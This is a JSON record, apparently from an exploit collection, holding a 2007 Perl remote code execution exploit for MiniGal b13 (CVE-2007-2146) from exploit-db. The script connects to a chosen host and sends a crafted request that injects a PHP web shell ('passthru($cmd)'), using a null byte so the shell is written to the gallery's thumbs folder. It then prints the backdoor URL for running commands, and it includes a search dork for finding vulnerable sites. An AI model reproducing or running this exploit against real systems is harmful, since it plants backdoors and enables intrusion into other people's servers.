{
  "id": "3754",
  "title": "MiniGal b13 - Remote Code Execution",
  "cve": "CVE-2007-2146",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n                        # MiniGal b13 \r\n\r\n# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n# * Author :\r\n\r\n            # Dj7xpl / Dj7xpl[at]Yahoo[dot]com\r\n\r\n# * Type :\r\n\r\n            # Remote Code Execution Exploit\r\n\r\n# * Download :\r\n\r\n            # http://www.minigal.dk\r\n\t\t\t\r\n# * D0rk :\r\n\r\n            # Powered by MiniGal (b13)\r\n\r\n# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nuse IO::Socket;\r\nif (@ARGV < 3){\r\nprint \"\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n*                                                                             *\r\n*    MiniGal b13  Remote Code Execution Exploit                               *\r\n*                                                                             *\r\n*    Usage   :  Xpl.pl [Target] [Path] [Backd00r Name] [Gallery Name]         *\r\n*                                                                             *\r\n*    Example :  Xpl.pl Dj7xpl.ir /minigal/ dj7xpl.php Pic                     *\r\n*                                                                             *\r\n*                    Vuln & Coded By Dj7xpl                                   *\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n\";\r\nexit();\r\n}\r\n$code = \"<?passthru(\\$cmd);?>\";\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$backdoorname=$ARGV[2];\r\n$listname=$ARGV[3];\r\nprint \"=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\\n\";\r\nprint \"\\n[~] MiniGal b13 Remote Code Execution Exploit Vuln&Coded By Dj7xpl\\n\";sleep (2);\r\nprint \"[~] Connect To http://\".$host.\"\\n\";sleep (2);\r\nprint \"[~] Create Backd00r\";sleep (1);print \".\";sleep (1);print \".\";sleep (1);print \".\";sleep (1);print \".\\n\";sleep (1);\r\nprint \"[~] Backd00r: http://\".$host.\"\".$path.\"\".$listname.\"/thumbs/\".$backdoorname.\"?cmd=ls -la\\n\\n\";\r\nprint \"=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\\n\";\r\n\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Connect Failed.\\n\\n\";\r\n    print $socket \"GET \".$path.\"index.php?input=\".$code.\"&name=Dj7xpl&email=Dj7xpl@yahoo.com&chatinput=1&list=\".$listname.\"&image=\".$backdoorname.\"%00 HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n\r\n# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n# Sp Tnx : Str0ke\r\n\r\n# milw0rm.com [2007-04-17]",
  "url": "https://www.exploit-db.com/exploits/3754"
}